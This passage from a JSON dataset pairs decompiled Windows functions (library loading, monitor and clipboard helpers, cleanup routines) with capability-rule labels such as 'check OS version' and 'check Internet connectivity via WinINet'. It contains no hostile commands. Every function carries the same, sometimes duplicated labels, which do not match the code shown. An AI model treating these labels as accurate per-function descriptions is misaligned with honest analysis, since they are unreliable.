        "decompiled_code": "\nuint __cdecl fcn.0042e5f4(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x49aaa6 == '\\0') {\n        *0x49aa90 = fcn.0042e120();\n        uVar1 = (**0x49aa90)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x49aa78)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x49aa78)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42e6c0);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 401
    },
    "0042e6c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e6c8(int32_t arg_8h, int32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0x49aaa7 == '\\0') {\n        *0x49aa94 = fcn.0042e120();\n        uVar1 = (**0x49aa94)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        uVar1 = 0;\n        if (arg_10h != NULL) {\n            var_1ch = 0;\n            var_18h = 0;\n            var_14h = (**0x49aa78)(0);\n            var_10h = (**0x49aa78)(1);\n            if (arg_8h == 0) {\n                if ((arg_ch != 0) && (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    return 1;\n                }\n            }\n            else {\n                var_ch = sub.gdi32.dll_GetClipBox(arg_8h, &var_2ch);\n                iVar2 = sub.gdi32.dll_GetDCOrgEx(arg_8h, &var_8h);\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                sub.user32.dll_OffsetRect(&var_1ch, -var_8h, -var_4h);\n                iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, &var_2ch);\n                if (((iVar2 == 0) || (arg_ch != 0)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    if (var_ch != 1) {\n                        return 0;\n                    }\n                    return 1;\n                }\n            }\n            uVar1 = (*arg_10h)(0x12340042, arg_8h, &var_1ch, arg_14h);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 555
    },
    "0042ea28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042ea28(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00407688();\n    if (*(iVar1 + 0x10) != 0) {\n        iVar1 = fcn.00407688();\n        iVar1 = sub.user32.dll_IsWindow(*(iVar1 + 0x10));\n        if (iVar1 != 0) goto code_r0x0042eabf;\n    }\n    do {\n        uVar2 = sub.user32.dll_FindWindowExA();\n        iVar1 = fcn.00407688();\n        *(iVar1 + 0x10) = uVar2;\n        fcn.00407688();\n        iVar1 = fcn.00407688();\n        if (*(iVar1 + 0x10) == 0) break;\n        iVar1 = fcn.00407688(0);\n        iVar1 = sub.user32.dll_GetWindowThreadProcessId(*(iVar1 + 0x10));\n        iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n    } while (iVar1 != iVar3);\ncode_r0x0042eabf:\n    iVar1 = fcn.00407688();\n    return *(iVar1 + 0x10);\n}\n",
        "token_count": 283
    },
    "0042ebcc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042ebcc(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x42ec04);\n    if (iVar1 != 0) {\n        *0x49aaac = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42ec10);\n    }\n    if (*0x49aaac == NULL) {\n        *0x49aaac = fcn.0042eae8;\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "0042ec2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ec2c(uint arg_8h, uint arg_ch)\n\n{\n    if (*0x49aaac == NULL) {\n        fcn.0042ebcc();\n    }\n    (**0x49aaac)();\n    return;\n}\n",
        "token_count": 58
    },
    "0042ec68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0042ec68(uchar param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uchar extraout_CL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n        param_1 = extraout_CL;\n    }\n    fcn.00404620();\n    *(in_EAX + 0xc) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 186
    },
    "0042ee80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042ee80(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    if (*0x49ab7c == NULL) {\n        uVar1 = 0;\n        if (*0x49ab70 != 0) {\n            *0x49ab7c = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42eef8);\n            if (*0x49ab7c != NULL) {\n                uVar1 = (**0x49ab7c)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x49ab7c)();\n    }\n    return uVar1;\n}\n",
        "token_count": 159
    },
    "0042ef0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042ef0c(void)\n\n{\n    uint uVar1;\n    \n    if (*0x49ab80 == NULL) {\n        uVar1 = 0x80004001;\n        if (*0x49ab70 != 0) {\n            *0x49ab80 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42ef64);\n            if (*0x49ab80 != NULL) {\n                uVar1 = (**0x49ab80)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x49ab80)();\n    }\n    return uVar1;\n}\n",
        "token_count": 141
    },
    "0042ef78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042ef78(void)\n\n{\n    uint uVar1;\n    \n    if (*0x49ab84 == NULL) {\n        uVar1 = 0x80004001;\n        if (*0x49ab70 != 0) {\n            *0x49ab84 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42efd8);\n            if (*0x49ab84 != NULL) {\n                uVar1 = (**0x49ab84)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x49ab84)();\n    }\n    return uVar1;\n}\n",
        "token_count": 140
    },
    "0042eff0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042eff0(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = 0x42effd;\n    fcn.0042ee70();\n    uStack12 = 0x42f1a7;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    if (0 < *0x49ab74) {\n        *0x49ab74 = *0x49ab74 + -1;\n    }\n    puStack8 = &stack0xfffffffc;\n    if ((*0x49ab70 != 0) && (puStack8 = &stack0xfffffffc,  *0x49ab74 == 0)) {\n        iStack20 = *0x49ab70;\n        puStack8 = &stack0xfffffffc;\n        sub.kernel32.dll_FreeLibrary_1();\n        *0x49ab70 = 0;\n        *0x49aab0 = 0;\n        *0x49aab4 = 0;\n        *0x49aab8 = 0;\n        *0x49aabc = 0;\n        *0x49aac0 = 0;\n        *0x49aac4 = 0;\n        *0x49aac8 = 0;\n        *0x49aacc = 0;\n        *0x49aad0 = 0;\n        *0x49aad4 = 0;\n        *0x49aad8 = 0;\n        *0x49aadc = 0;\n        *0x49aae0 = 0;\n        *0x49aae4 = 0;\n        *0x49aae8 = 0;\n        *0x49aaec = 0;\n        *0x49aaf0 = 0;\n        *0x49aaf4 = 0;\n        *0x49aaf8 = 0;\n        *0x49aafc = 0;\n        *0x49ab00 = 0;\n        *0x49ab04 = 0;\n        *0x49ab08 = 0;\n        *0x49ab0c = 0;\n        *0x49ab10 = 0;\n        *0x49ab14 = 0;\n        *0x49ab18 = 0;\n        *0x49ab1c = 0;\n        *0x49ab20 = 0;\n        *0x49ab24 = 0;\n        *0x49ab28 = 0;\n        *0x49ab2c = 0;\n        *0x49ab30 = 0;\n        *0x49ab34 = 0;\n        *0x49ab38 = 0;\n        *0x49ab3c = 0;\n        *0x49ab40 = 0;\n        *0x49ab44 = 0;\n        *0x49ab48 = 0;\n        *0x49ab4c = 0;\n        *0x49ab50 = 0;\n        *0x49ab54 = 0;\n        *0x49ab58 = 0;\n        *0x49ab5c = 0;\n        *0x49ab60 = 0;\n        *0x49ab64 = 0;\n        *0x49ab68 = 0;\n    }\n    *in_FS_OFFSET = iStack20;\n    uStack12 = 0x42f1ae;\n    iStack16 = 0x42f1a6;\n    fcn.0042ee78();\n    return;\n}\n",
        "token_count": 814
    },
    "0042f1b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.0042f1b0(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffe6c;\n    int32_t iStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_1h;\n    \n    puStack16 = 0x42f1c4;\n    fcn.0042ee70();\n    uStack20 = 0x42f563;\n    iStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    *0x49ab74 = *0x49ab74 + 1;\n    puStack16 = &fcn.0042f1b0::var_1h + 1;\n    if (*0x49ab70 == 0) {\n        puStack16 = &fcn.0042f1b0::var_1h + 1;\n        *0x49ab70 = sub.kernel32.dll_LoadLibraryA(0x42f574);\n        if (*0x49ab70 != 0) {\n            *0x49aab0 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f580);\n            *0x49aab4 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f590);\n            *0x49aab8 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f5a0);\n            *0x49aabc = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f5b4);\n            *0x49aac0 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f5c4);\n            *0x49aac4 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f5c4);\n            *0x49aac8 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f5e4);\n            *0x49aacc = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f5f8);\n            *0x49aad0 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f60c);\n            *0x49aad4 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f620);\n            *0x49aad8 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f63c);\n            *0x49aadc = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f654);\n            *0x49aae0 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f664);\n            *0x49aae4 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f674);\n            *0x49aae8 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f688);\n            *0x49aaec = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f6b0);\n            *0x49aaf0 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f6c0);\n            *0x49aaf4 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f6d0);\n            *0x49aaf8 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f6e0);\n            *0x49aafc = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f6f0);\n            *0x49ab00 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f6fc);\n            *0x49ab04 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f710);\n            *0x49ab08 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f724);\n            *0x49ab0c = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f734);\n            *0x49ab10 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f744);\n            *0x49ab14 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f754);\n            *0x49ab18 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f764);\n            *0x49ab1c = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f77c);\n            *0x49ab20 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f78c);\n            *0x49ab24 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f7a0);\n            *0x49ab28 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f7b4);\n            *0x49ab2c = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f7cc);\n            *0x49ab30 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f7dc);\n            *0x49ab34 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f7ec);\n            *0x49ab38 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f7fc);\n            *0x49ab3c = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f810);\n            *0x49ab40 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f820);\n            *0x49ab44 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f830);\n            *0x49ab48 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f83c);\n            *0x49ab4c = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f84c);\n            *0x49ab50 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f868);\n            *0x49ab54 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f884);\n            *0x49ab58 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f89c);\n            *0x49ab5c = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f8b4);\n            *0x49ab60 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f8c8);\n            *0x49ab64 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f8e8);\n            in_stack_fffffe6c = *0x49ab70;\n            *0x49ab68 = sub.kernel32.dll_GetProcAddress_1(*0x49ab70, 0x42f904);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffe6c;\n    fcn.0042ee78(0x42f56a);\n    return;\n}\n",
        "token_count": 1770
    },
    "0042f914": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042f914(void)\n\n{\n    int32_t iVar1;\n    \n    if (((*0x49ab70 != 0) && (iVar1 = (**0x49ab44)(),  iVar1 != 0)) && (iVar1 = (**0x49ab40)(),  iVar1 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 87
    },
    "0042f93c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042f93c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42f984;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x49ab6c = *0x49ab6c + 1;\n    if (*0x49ab6c == 0) {\n        while (0 < *0x49ab74) {\n            fcn.0042eff0();\n        }\n        fcn.00404650();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 166
    },
    "0042f990": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042f990(void)\n\n{\n    uint uVar1;\n    \n    if (*0x49ab90 == NULL) {\n        if (*0x49ab8c == 0) {\n            *0x49ab8c = sub.kernel32.dll_LoadLibraryA(0x42fa00);\n        }\n        uVar1 = 0x80004001;\n        if (*0x49ab8c != 0) {\n            *0x49ab90 = sub.kernel32.dll_GetProcAddress_1(*0x49ab8c, 0x42fa0c);\n            if (*0x49ab90 != NULL) {\n                uVar1 = (**0x49ab90)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x49ab90)();\n    }\n    return uVar1;\n}\n",
        "token_count": 182
    },
    "0042fa2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042fa2c(void)\n\n{\n    uint uVar1;\n    \n    if (*0x49ab94 == NULL) {\n        if (*0x49ab8c == 0) {\n            *0x49ab8c = sub.kernel32.dll_LoadLibraryA(0x42fa98);\n        }\n        uVar1 = 0x80004001;\n        if (*0x49ab8c != 0) {\n            *0x49ab94 = sub.kernel32.dll_GetProcAddress_1(*0x49ab8c, 0x42faa4);\n            if (*0x49ab94 != NULL) {\n                uVar1 = (**0x49ab94)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x49ab94)();\n    }\n    return uVar1;\n}\n",
        "token_count": 183
    },
    "0042fabc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t __fastcall fcn.0042fabc(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (5 < **0x49595c) {\n        iVar1 = fcn.0042fa2c();\n        if ((iVar1 == 0) && (param_1 != 0)) {\n            return CONCAT44(param_1, 1);\n        }\n    }\n    return param_1 << 0x20;\n}\n",
        "token_count": 101
    },
    "0042fae0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042fae0(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42fb1b;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x49ab88 = *0x49ab88 + 1;\n    if ((*0x49ab88 == 0) && (*0x49ab8c != 0)) {\n        iStack20 = *0x49ab8c;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 179
    },
    "004308ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004308ac(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x430905;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x49ab9c = *0x49ab9c + 1;\n    if (*0x49ab9c == 0) {\n        puVar1 = &stack0xfffffffc;\n        if ((*0x49aba4 != '\\0') && (puVar1 = &stack0xfffffffc,  *0x49aba0 != 0)) {\n            iStack20 = *0x49aba0;\n            sub.kernel32.dll_FreeLibrary_1();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.004060f8();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 248
    },
    "00430b20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00430b20(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffcc;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x430b9f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    sub.user32.dll_KillTimer(*(in_EAX + 0x34), 1);\n    if (((*(in_EAX + 0x30) != 0) && (*(in_EAX + 0x40) != '\\0')) && (*(in_EAX + 0x3a) != 0)) {\n        in_stack_ffffffcc = *(in_EAX + 0x34);\n        iVar1 = sub.user32.dll_SetTimer(in_stack_ffffffcc, 1, *(in_EAX + 0x30), 0);\n        if (iVar1 == 0) {\n            fcn.00407550();\n            fcn.0040db04();\n            fcn.00404ec4();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.00405530(0x430ba6);\n    return;\n}\n",
        "token_count": 303
    },
    "00431240": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00431240(void)\n\n{\n    uchar *puVar1;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x431293;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x49abb4 = *0x49abb4 + 1;\n    if (*0x49abb4 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x493334 != 0) {\n            uStack20 = *0x493334;\n            sub.kernel32.dll_GlobalDeleteAtom();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.004060f8();\n    }\n    *in_FS_OFFSET = uStack20;\n    return;\n}\n",
        "token_count": 219
    },
    "00431378": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00431378(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((in_EAX[1] != 0) && (*(in_EAX + 0xd) == '\\0')) {\n        (**(*in_EAX + 0x10))();\n        *(in_EAX + 0xd) = 1;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00431520": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00431520(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint hMem;\n    uint var_4h;\n    \n    uStack20 = 0x431534;\n    (**(*in_EAX + 0x18))();\n    uStack20 = 1;\n    puStack24 = 0x43153b;\n    iVar1 = sub.user32.dll_GetClipboardData();\n    uStack28 = 0x431592;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (iVar1 == 0) {\n        iStack36 = 0x43156d;\n        puStack24 = &stack0xfffffffc;\n        fcn.00405530();\n    }\n    else {\n        puStack24 = &stack0xfffffffc;\n        sub.kernel32.dll_GlobalLock();\n        fcn.00405728();\n        iStack36 = iVar1;\n    }\n    *in_FS_OFFSET = iStack36;\n    uStack28 = 0x431599;\n    if (iVar1 != 0) {\n        iStack32 = iVar1;\n        sub.kernel32.dll_GlobalUnlock();\n    }\n    (**(*in_EAX + 0x14))();\n    return;\n}\n",
        "token_count": 323
    },
    "004317b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
